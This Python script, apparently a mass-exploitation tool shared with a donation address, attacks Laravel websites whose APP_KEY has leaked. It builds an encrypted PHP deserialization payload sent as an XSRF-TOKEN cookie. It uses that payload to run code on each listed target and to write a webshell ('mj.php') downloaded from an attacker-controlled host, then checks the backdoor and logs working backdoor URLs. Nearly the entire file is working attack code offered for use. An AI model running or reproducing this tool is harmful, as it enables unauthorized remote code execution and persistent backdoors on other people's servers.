## Author Bob Marley
## BTC : 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh (All donation Acceptable and thank you in advance)
## Find https://changehere.com and change it into your website

import os
import base64
import json
import requests
import hmac
import re
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from datetime import datetime
from pystyle import Write, Colors, Colorate, Center
from colorama import Fore, Style, init

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

def print_ascii():
    smtp_checker = r"""

██████╗  ██████╗███████╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██╔════╝██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██████╔╝██║     █████╗      █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██╔══██╗██║     ██╔══╝      ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
██║  ██║╚██████╗███████╗    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                                
   """
    by = r"""
                                 
                        ██████╗ ██╗   ██╗
                        ██╔══██╗╚██╗ ██╔╝
                        ██████╔╝ ╚████╔╝ 
                        ██╔══██╗  ╚██╔╝  
                        ██████╔╝   ██║   
                        ╚═════╝    ╚═╝   
                 
    """
    bob_marley = r"""

██████╗  ██████╗ ██████╗     ███╗   ███╗ █████╗ ██████╗ ██╗     ███████╗██╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗    ████╗ ████║██╔══██╗██╔══██╗██║     ██╔════╝╚██╗ ██╔╝
██████╔╝██║   ██║██████╔╝    ██╔████╔██║███████║██████╔╝██║     █████╗   ╚████╔╝ 
██╔══██╗██║   ██║██╔══██╗    ██║╚██╔╝██║██╔══██║██╔══██╗██║     ██╔══╝    ╚██╔╝  
██████╔╝╚██████╔╝██████╔╝    ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗███████╗   ██║   
╚═════╝  ╚═════╝ ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   
                                                                                 
   """
    print()
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, smtp_checker, 1)))
    print(Center.XCenter(Colorate.Horizontal(Colors.yellow_to_green, by, 1)))
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, bob_marley, 1)))
    print()

def payload(key_b64, php_code):
    key = base64.b64decode(key_b64.replace('base64:', ''))
    obj = (
        f'O:29:"Illuminate\\Support\\MessageBag":2:{{s:11:"\x00*\x00messages";a:0:{{}}'
        f's:9:"\x00*\x00format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{'
        f's:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":1:{{s:16:"\x00*\x00queueResolver";'
        f'a:2:{{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{{}}i:1;s:4:"load";}}}}s:8:"\x00*\x00event";'
        f'O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{{'
        f's:9:"\x00*\x00config";O:35:"Mockery\\Generator\\MockConfiguration":1:{{s:7:"\x00*\x00name";s:7:"abcdefg";}}'
        f's:7:"\x00*\x00code";s:{len(php_code)}:"{php_code}";}}}}}}'
    )
    encoded = base64.b64encode(obj.encode()).decode()
    return encrypt(encoded, key)

def encrypt(text, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_b64 = base64.b64encode(iv)
    mac = hmac.new(key, iv_b64 + payload, sha256).hexdigest()
    data = json.dumps({'iv': iv_b64.decode(), 'value': payload.decode(), 'mac': mac})
    return base64.b64encode(data.encode()).decode()

def get_webroot(url, app_key):
    for php_code in [
        'echo $_SERVER["DOCUMENT_ROOT"];',
        'echo getcwd();'
    ]:
        headers = {'User-Agent':'Mozilla/5.0'}
        payload_cookie = payload(app_key, f'<?php {php_code} ?>')
        cookies = {"XSRF-TOKEN": payload_cookie}
        try:
            resp = requests.get(url + "/public", headers=headers, cookies=cookies, timeout=8, verify=False).text
            if not resp or len(resp) > 100 or not resp.startswith('/'):
                resp = requests.get(url + "/", headers=headers, cookies=cookies, timeout=8, verify=False).text
            match = re.search(r'(/[^\s<]+)', resp)
            if match:
                return match.group(1)
        except Exception:
            continue
    return None

def build_backdoor_url(url, webroot, backdoor_name):
    if webroot.endswith("/public"):
        return url.rstrip("/") + "/public/" + backdoor_name
    else:
        return url.rstrip("/") + "/" + backdoor_name

def exploit(url, app_key, backdoor_name):
    webroot = get_webroot(url, app_key)
    if not webroot:
        return "Can't determine webroot", None

    shell_code = f'''<?php $f=fopen("{webroot}/{backdoor_name}","w");$c=file_get_contents("https://changehere.com/mj.txt");fwrite($f,$c);fclose($f);echo "LEGION EXPLOIT V3"; ?>'''   ## https://changehere.com/mj.txt (Change your Webshell here make sure its in txt and already uploaded into a dummy website of yours)
    headers = {'User-Agent':'Mozilla/5.0'}
    try:
        payload_cookie = payload(app_key, shell_code)
        cookies = {"XSRF-TOKEN": payload_cookie}
        resp = requests.get(url + "/public", headers=headers, cookies=cookies, timeout=8, verify=False).text
        if "LEGION EXPLOIT" not in resp:
            resp = requests.get(url + "/", headers=headers, cookies=cookies, timeout=8, verify=False).text
        if "LEGION" in resp:
            backdoor_url = build_backdoor_url(url, webroot, backdoor_name)
            try:
                check = requests.get(backdoor_url, headers=headers, timeout=8, verify=False).text
                if "MARIJUANA" in check or "@TheAlmightyZeus" in check: ## You must change the Fingerprint inorder for the Check Valid VULN confirmed positive not false positive.
                    return "Backdoor working", backdoor_url
                else:
                    return "Backdoor not found", backdoor_url
            except Exception as e:
                return f"Backdoor check error: {str(e)}", backdoor_url
        else:
            return "Can't exploit", None
    except Exception as e:
        return f"ERROR: {str(e)}", None

def main():
    print_ascii()
    input_file = Write.Input("Input your RCE list filename: ", Colors.green_to_yellow, interval=0.005)
    if not os.path.isfile(input_file):
        Write.Print(f"\n[!] File not found: {input_file}\n", Colors.red_to_yellow, interval=0.002)
        return

    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_dir = "RCE-RESULT"
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, f"Result_{now}.txt")
    backdoor_name = "mj.php"

    with open(input_file) as f:
        targets = [line.strip() for line in f if line.strip() and "|" in line]

    for line in targets:
        url, app_key = line.strip().split("|", 1)
        Write.Print(f"\n[>] Exploiting {url} ...\n", Colors.yellow_to_green, interval=0.001)
        status, backdoor_url = exploit(url.strip(), app_key.strip(), backdoor_name)
        if status == "Backdoor working":
            result_line = f"{backdoor_url}"
            with open(output_file, "a") as out:
                out.write(result_line + "\n")
            Write.Print(f"[VULN] {result_line}\n", Colors.green_to_yellow, interval=0.001)
        elif status == "Backdoor not found":
            Write.Print(f"[FAIL] {url} (exploit worked, but backdoor not accessible)\n", Colors.yellow_to_red, interval=0.001)
        elif status == "Can't exploit":
            Write.Print(f"[FAIL] {url}\n", Colors.red_to_yellow, interval=0.001)
        else:
            Write.Print(f"[ERROR] {url} => {status}\n", Colors.red_to_yellow, interval=0.001)

    Write.Print(f"\n[+] Done! Results saved in {output_file}\n", Colors.green_to_yellow, interval=0.002)

if __name__ == "__main__":
    main()
